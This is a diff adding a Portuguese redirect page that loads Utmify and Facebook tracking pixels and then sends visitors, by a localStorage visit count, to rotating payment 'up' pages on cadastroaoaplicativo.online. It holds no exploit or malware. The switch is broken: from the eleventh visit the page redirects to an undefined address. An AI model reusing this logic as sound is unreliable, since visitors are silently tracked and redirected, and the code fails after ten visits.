@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecionamento</title>
+
+
+
+<script>
+  window.pixelId = "6800b134ebd4fe5c54b14d47";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;n=f.fbq=function(){
+      n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)
+    };
+    if(!f._fbq)f._fbq=n;
+    n.push=n;
+    n.loaded=!0;
+    n.version='2.0';
+    n.queue=[];
+    t=b.createElement(e);t.async=!0;
+    t.src=v;
+    s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)
+  }(
+    window,
+    document,
+    'script',
+    'https://connect.facebook.net/en_US/fbevents.js'
+  );
+  fbq('init', '598153602790130');
+  fbq('track', 'PageView');
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=598153602790130&ev=PageView&noscript=1"
+  />
+</noscript>
+<!-- End Facebook Pixel Code -->
+</head>
+<body>
+
+<script>
+    // Função para obter o número de vezes que o usuário visitou a página
+    function getVisitCount() {
+        // Obtém o valor armazenado no local storage ou retorna 0 se não existir
+        return parseInt(localStorage.getItem('visitCount')) || 0;
+    }
+
+    // Função para redirecionar com base no número de visitas
+    function redirectToPage() {
+        var visitCount = getVisitCount();
+
+        // Determina a página de redirecionamento com base no número de visitas
+        var nextPage;
+        switch (visitCount) {
+            case 0:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/1/';
+                break;
+            case 1:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/2/';
+                break;
+            case 2:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/3/';
+                break;
+            case 3:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/1/';
+                break;
+            case 4:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/2/';
+                break;
+            case 5:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/3/';
+                break;
+            case 6:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/1/';
+                break;
+            case 7:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/2';
+                break;
+            case 8:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/3/';
+                break;
+            case 9:
+                nextPage = 'https://pay.cadastroaoaplicativo.online//up/1/';
+                break;
+            case 10:
+        }
+
+        // Incrementa o número de visitas
+        localStorage.setItem('visitCount', visitCount + 1);
+
+        // Redireciona para a próxima página
+        window.location.href = nextPage;
+    }
+
+    // Chama a função de redirecionamento quando a página é carregada
+    redirectToPage();
+</script>
+
+</body>
+</html>
